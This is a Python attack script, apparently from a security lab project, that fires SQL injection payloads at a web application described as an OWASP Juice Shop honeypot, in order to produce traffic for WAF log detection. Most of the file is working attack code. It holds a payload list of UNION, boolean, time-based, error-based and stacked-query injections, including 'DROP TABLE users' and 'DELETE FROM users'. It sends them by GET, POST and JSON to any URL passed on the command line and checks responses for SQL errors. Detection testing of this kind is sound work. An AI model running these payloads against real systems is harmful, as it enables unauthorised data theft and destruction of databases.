#!/usr/bin/env python3
"""
SQL Injection Attack Script
Project A.V.A.R.S - Phase 2: Attack & Ingestion

This script simulates SQL injection attacks against the OWASP Juice Shop honeypot.
Demonstrates detection of SQL injection patterns in firewall/WAF logs.

IMPORTANT: Use only on authorized systems for testing purposes.

Requirements:
    - requests
    - argparse
"""

import requests
import time
import logging
import argparse
import sys
import urllib.parse
from datetime import datetime
from typing import List, Dict

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'sql_injection_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class SQLInjectionTester:
    """
    Simulates SQL injection attacks for testing detection capabilities
    """
    
    def __init__(self, target_url: str, timeout: int = 10):
        """
        Initialize the SQL injection tester
        
        Args:
            target_url: URL to target (e.g., http://honeypot-domain:3000)
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.attempts = 0
        self.detected = 0
        
        logger.info(f"[*] SQL Injection Tester Initialized")
        logger.info(f"[*] Target: {self.target_url}")
    
    def get_sql_injection_payloads(self) -> Dict[str, List[str]]:
        """
        SQL Injection payloads organized by type
        
        Returns:
            Dictionary with payload categories
        """
        payloads = {
            "UNION based": [
                "' UNION SELECT * FROM users--",
                "' UNION SELECT NULL, NULL, NULL--",
                "admin' UNION SELECT 1,2,3,4,5--",
                "1' UNION ALL SELECT NULL,NULL,NULL--",
            ],
            "Boolean based": [
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin' OR '1'='1",
                "' OR 'a'='a",
            ],
            "Time based": [
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
            "Error based": [
                "' AND extractvalue(rand(),concat(0x3a,version())) AND '1'='1",
                "' AND updatexml(rand(),concat(0x3a,version()),rand()) AND '1'='1",
                "1' AND 1=CONVERT(int, (SELECT @@version))--",
            ],
            "Stacked queries": [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES ('hacker', 'password')--",
                "'; DELETE FROM users--",
            ],
            "Comment injection": [
                "admin'--",
                "admin';#",
                "admin'/**/OR/**/1=1--",
                "' OR 1=1/*",
            ]
        }
        
        return payloads
    
    def extract_endpoints(self) -> List[str]:
        """
        Discover endpoints vulnerable to SQL injection
        
        Returns:
            List of potential vulnerable endpoints
        """
        endpoints = [
            "/api/users",
            "/api/products",
            "/api/orders",
            "/search",
            "/products",
            "/users",
            "/login",
            "/api/login",
        ]
        
        return endpoints
    
    def attempt_sqli(self, endpoint: str, parameter: str, payload: str) -> bool:
        """
        Attempt SQL injection attack
        
        Args:
            endpoint: Target endpoint
            parameter: Query parameter to inject
            payload: SQL injection payload
            
        Returns:
            True if payload delivered, False otherwise
        """
        try:
            url = f"{self.target_url}{endpoint}"
            
            # Try different injection methods
            injection_methods = [
                # URL parameter injection
                {
                    "url": f"{url}?{parameter}={urllib.parse.quote(payload)}",
                    "method": "GET",
                    "data": None
                },
                # POST body injection
                {
                    "url": url,
                    "method": "POST",
                    "data": {parameter: payload}
                },
                # JSON injection
                {
                    "url": url,
                    "method": "POST",
                    "data": {parameter: payload},
                    "json": True
                }
            ]
            
            for method_config in injection_methods:
                try:
                    logger.debug(f"[*] Testing {method_config['method']} {method_config['url']}")
                    
                    if method_config['method'] == 'GET':
                        response = self.session.get(
                            method_config['url'],
                            timeout=self.timeout,
                            headers={"User-Agent": "Mozilla/5.0 (SQLInjectionTester/1.0)"}
                        )
                    else:
                        json_data = method_config.get('data') if method_config.get('json') else None
                        response = self.session.post(
                            method_config['url'],
                            json=json_data if json_data else method_config['data'],
                            timeout=self.timeout,
                            headers={"User-Agent": "Mozilla/5.0 (SQLInjectionTester/1.0)"}
                        )
                    
                    # Check for successful delivery
                    if response.status_code in [200, 201, 400, 403, 500]:
                        self.attempts += 1
                        logger.info(f"[*] Payload delivered: {method_config['method']} {endpoint} - Status {response.status_code}")
                        
                        # Check for SQL errors in response
                        if self._detect_sql_error(response.text):
                            self.detected += 1
                            logger.warning(f"[!] SQL ERROR DETECTED: {endpoint}")
                            return True
                        
                        return True
                        
                except requests.exceptions.RequestException as e:
                    continue
            
            return False
            
        except Exception as e:
            logger.error(f"[!] Error during SQL injection attempt: {str(e)}")
            return False
    
    def _detect_sql_error(self, response_text: str) -> bool:
        """
        Detect SQL error messages in response
        
        Args:
            response_text: Response body text
            
        Returns:
            True if SQL error detected, False otherwise
        """
        sql_error_patterns = [
            "sql",
            "syntax error",
            "mysql_fetch",
            "mysql_error",
            "warning: mysql",
            "odbc error",
            "ora-",
            "sqlserver",
            "postgresql",
            "sqlite",
            "exception",
            "invalid query",
        ]
        
        response_lower = response_text.lower()
        return any(pattern in response_lower for pattern in sql_error_patterns)
    
    def run_attack(self, delay: float = 0.5) -> None:
        """
        Execute SQL injection attacks
        
        Args:
            delay: Delay between requests in seconds
        """
        payloads = self.get_sql_injection_payloads()
        endpoints = self.extract_endpoints()
        
        total_tests = sum(len(p) for p in payloads.values()) * len(endpoints)
        
        logger.info(f"[+] Starting SQL Injection tests")
        logger.info(f"[+] Endpoints to test: {len(endpoints)}")
        logger.info(f"[+] Total payload categories: {len(payloads)}")
        logger.info(f"[+] Estimated tests: {total_tests}")
        logger.info(f"[+] Attack started at {datetime.now().isoformat()}\n")
        
        try:
            test_count = 0
            
            for category, payload_list in payloads.items():
                logger.info(f"\n[*] Testing category: {category}")
                
                for endpoint in endpoints:
                    for payload in payload_list:
                        test_count += 1
                        
                        # Try common parameter names
                        for param in ["id", "search", "query", "email", "username"]:
                            self.attempt_sqli(endpoint, param, payload)
                            time.sleep(delay)
                        
                        if test_count % 10 == 0:
                            logger.info(f"[*] Progress: {test_count}/{total_tests} tests completed")
        
        except KeyboardInterrupt:
            logger.warning("[!] Attack interrupted by user")
        except Exception as e:
            logger.error(f"[!] Unexpected error: {str(e)}")
        finally:
            self.print_summary()
    
    def print_summary(self) -> None:
        """Print attack summary"""
        logger.info(f"\n{'='*60}")
        logger.info(f"SQL INJECTION TEST SUMMARY")
        logger.info(f"{'='*60}")
        logger.info(f"Total Payloads Delivered:  {self.attempts}")
        logger.info(f"SQL Errors Detected:       {self.detected}")
        if self.attempts > 0:
            logger.info(f"Success Rate:              {(self.detected/self.attempts)*100:.2f}%")
        logger.info(f"{'='*60}\n")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="SQL Injection Attack Simulation",
        epilog="DISCLAIMER: Use only on authorized systems for testing purposes."
    )
    
    parser.add_argument(
        "target",
        help="Target URL (e.g., http://honeypot-hostname:3000)"
    )
    
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=0.5,
        help="Delay between requests in seconds (default: 0.5)"
    )
    
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    # Validate target URL
    if not args.target.startswith("http"):
        args.target = f"http://{args.target}"
    
    try:
        tester = SQLInjectionTester(args.target, timeout=args.timeout)
        tester.run_attack(delay=args.delay)
        
    except Exception as e:
        logger.error(f"[!] Fatal error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
